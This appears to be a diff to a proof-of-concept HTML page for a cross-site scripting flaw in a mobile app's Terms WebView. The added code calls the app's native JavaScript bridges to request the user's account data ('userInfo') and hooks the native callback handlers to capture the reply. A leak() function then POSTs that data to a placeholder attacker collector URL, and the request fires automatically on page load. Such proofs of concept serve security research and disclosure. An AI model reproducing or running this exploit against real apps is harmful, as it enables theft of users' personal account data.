@@ -35,6 +35,14 @@
         margin-top: 8px;
         color: #555;
       }
+      pre {
+        margin-top: 16px;
+        padding: 8px;
+        background: #eee;
+        font-size: 12px;
+        max-height: 200px;
+        overflow: auto;
+      }
     </style>
   </head>
   <body>
@@ -42,11 +50,24 @@
       <h1>GAUTH XSS POC</h1>
       <p>If you see this inside the app, JS is running in the Terms WebView.</p>
 
-      <button onclick="testBridge()">TEST NATIVE BRIDGE</button>
-      <small>After pressing, check Frida logs for JSB2Impl.invokeMethod(core.getNativeData).</small>
+      <button onclick="testBridge()">REQUEST userInfo VIA BRIDGE</button>
+      <small>After pressing, check Frida logs and your collector endpoint for exfiltrated userInfo.</small>
+
+      <pre id="log"></pre>
     </div>
 
     <script>
+      // --- simple logger to screen ---
+      function log(msg) {
+        try {
+          console.log(msg);
+          var el = document.getElementById("log");
+          if (el) {
+            el.textContent += msg + "\n";
+          }
+        } catch (e) {}
+      }
+
       // Confirm control of the WebView
       alert("WebView controlled");
 
@@ -56,32 +77,115 @@
         if (window.BDXBridge) msg.push("BDXBridge");
         if (window.ToutiaoJSBridge) msg.push("ToutiaoJSBridge");
         alert("Available bridges: " + (msg.join(", ") || "none"));
-      }, 1000);
+        log("Available bridges: " + (msg.join(", ") || "none"));
+      }, 500);
 
-      // Reuse the real bridge call you captured: core.getNativeData("userInfo")
-      function testBridge() {
+      // Send the core.getNativeData("userInfo") request
+      function sendUserInfoRequest() {
+        var payload = {
+          func: "core.getNativeData",
+          params: { key: "userInfo" },
+          JSSDK: "2.2.10",
+          __msg_type: "call",
+          __callback_id: "9999"
+        };
+
+        log("[PoC] Sending core.getNativeData(userInfo) with cb_id=9999");
         try {
-          var payload = {
-            "func": "core.getNativeData",
-            "params": { "key": "userInfo" },
-            "JSSDK": "2.2.10",
-            "__msg_type": "call",
-            "__callback_id": "9999"
-          };
-
-          if (window.ToutiaoJSBridge && ToutiaoJSBridge.invokeMethod) {
+          if (window.ToutiaoJSBridge && typeof ToutiaoJSBridge.invokeMethod === "function") {
             ToutiaoJSBridge.invokeMethod(JSON.stringify(payload));
-            alert("Sent ToutiaoJSBridge.invokeMethod(core.getNativeData,userInfo)");
-          } else if (window.BDXBridge && BDXBridge._invokeMethod) {
+            alert("Sent ToutiaoJSBridge.invokeMethod(core.getNativeData, userInfo)");
+          } else if (window.BDXBridge && typeof BDXBridge._invokeMethod === "function") {
             BDXBridge._invokeMethod(JSON.stringify(payload));
-            alert("Sent BDXBridge._invokeMethod(core.getNativeData,userInfo)");
+            alert("Sent BDXBridge._invokeMethod(core.getNativeData, userInfo)");
           } else {
             alert("No bridge method available");
+            log("[PoC] No bridge method available");
           }
         } catch (e) {
           alert("Bridge error: " + e);
+          log("[PoC] Bridge error: " + e);
         }
       }
+
+      // Exfiltration function
+      function leak(data) {
+        try {
+          log("[PoC] leak() called, preparing to exfiltrate userInfo");
+          var userInfo = data.data || data;  // depending on how native wraps it
+
+          // Replace this URL with your own collector endpoint
+          var url = "https://your-attacker-endpoint.example.com/gauth-poc";
+
+          fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              ts: Date.now(),
+              userInfo: userInfo
+            })
+          }).then(function (res) {
+            log("[PoC] Exfiltration HTTP status: " + res.status);
+          }).catch(function (err) {
+            log("[PoC] Exfiltration error: " + err);
+          });
+        } catch (e) {
+          log("[PoC] leak() exception: " + e);
+        }
+      }
+
+      // Hook likely native->JS callback entrypoints
+      // You may need to adapt these names after you see real traffic in Frida
+      (function hookNativeCallbacks() {
+        // Example 1: generic handler used by some bridges
+        if (window.Native2JSBridge && typeof window.Native2JSBridge.onMessage === "function") {
+          var orig = window.Native2JSBridge.onMessage;
+          window.Native2JSBridge.onMessage = function (msg) {
+            try {
+              log("[PoC] Native2JSBridge.onMessage: " + msg);
+              var obj = (typeof msg === "string") ? JSON.parse(msg) : msg;
+              if (obj.__msg_type === "callback" && obj.__callback_id === "9999") {
+                log("[PoC] userInfo callback matched (Native2JSBridge)");
+                leak(obj);
+              }
+            } catch (e) {
+              log("[PoC] onMessage hook error: " + e);
+            }
+            return orig.apply(this, arguments);
+          };
+          log("[PoC] Hooked Native2JSBridge.onMessage");
+        }
+
+        // Example 2: ToutiaoJSBridge-style handler
+        if (window.ToutiaoJSBridge && typeof window.ToutiaoJSBridge._handleMessageFromNative === "function") {
+          var orig2 = window.ToutiaoJSBridge._handleMessageFromNative;
+          window.ToutiaoJSBridge._handleMessageFromNative = function (msg) {
+            try {
+              log("[PoC] _handleMessageFromNative: " + msg);
+              var obj = (typeof msg === "string") ? JSON.parse(msg) : msg;
+              if (obj.__msg_type === "callback" && obj.__callback_id === "9999") {
+                log("[PoC] userInfo callback matched (_handleMessageFromNative)");
+                leak(obj);
+              }
+            } catch (e) {
+              log("[PoC] _handleMessageFromNative hook error: " + e);
+            }
+            return orig2.apply(this, arguments);
+          };
+          log("[PoC] Hooked ToutiaoJSBridge._handleMessageFromNative");
+        }
+      })();
+
+      // Button handler to manually trigger the request
+      function testBridge() {
+        sendUserInfoRequest();
+      }
+
+      // Optional: auto-run when page loads
+      window.addEventListener("load", function () {
+        log("[PoC] Page loaded, auto-sending userInfo request");
+        sendUserInfoRequest();
+      });
     </script>
   </body>
 </html>
